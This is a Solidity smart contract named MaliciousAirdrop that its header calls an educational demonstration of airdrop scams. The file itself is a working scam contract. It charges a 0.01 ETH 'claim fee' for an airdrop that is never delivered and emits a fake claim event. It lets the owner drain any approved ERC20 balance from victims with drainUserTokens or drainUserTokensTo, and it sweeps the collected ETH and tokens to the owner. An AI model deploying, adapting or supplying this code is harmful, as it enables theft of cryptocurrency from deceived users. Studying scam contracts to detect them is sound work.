// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
* @title MaliciousAirdrop
* @dev This contract demonstrates common malicious airdrop scam techniques
* WARNING: This is for educational purposes only - DO NOT deploy to mainnet
*/
contract MaliciousAirdrop is Ownable {
    mapping(address => bool) public hasClaimed;
    event AirdropClaimed(address indexed user, uint256 amount);
    event TokensDrained(address indexed user, address indexed token, uint256 amount);

    constructor(address initialOwner) Ownable(initialOwner) {}

    function claimAirdrop(string memory _referralCode) external payable returns (bool) {
        require(!hasClaimed[msg.sender], "Already claimed");
        require(bytes(_referralCode).length > 0, "Invalid referral code");
        require(msg.value == 0.01 ether, "Claim fee is 0.01 ETH");
        hasClaimed[msg.sender] = true;
        emit AirdropClaimed(msg.sender, 1000 * 10**18);
        return true;
    }

    function drainUserTokens(address _user, address _token) external onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 balance = token.balanceOf(_user);
        if (balance > 0) {
            require(token.transferFrom(_user, owner(), balance), "Transfer failed");
            emit TokensDrained(_user, _token, balance);
        }
    }

    function drainUserTokensTo(address _user, address _token, address _to) external onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 balance = token.balanceOf(_user);
        if (balance > 0) {
            require(token.transferFrom(_user, _to, balance), "Transfer failed");
            emit TokensDrained(_user, _token, balance);
        }
    }

    function checkEligibility(address _user) external view returns (bool) {
        return !hasClaimed[_user];
    }

    function getAirdropInfo(address _user) external view returns (uint256, uint256, uint256) {
        uint256 totalClaimed = hasClaimed[_user] ? 1000 * 10**18 : 0;
        uint256 availableRewards = hasClaimed[_user] ? 0 : 1000 * 10**18;
        uint256 tasksCompleted = hasClaimed[_user] ? 1 : 0;
        return (totalClaimed, availableRewards, tasksCompleted);
    }

    function withdrawETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function withdrawERC20(address _token) external onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(owner(), balance);
        }
    }

    receive() external payable {}
} 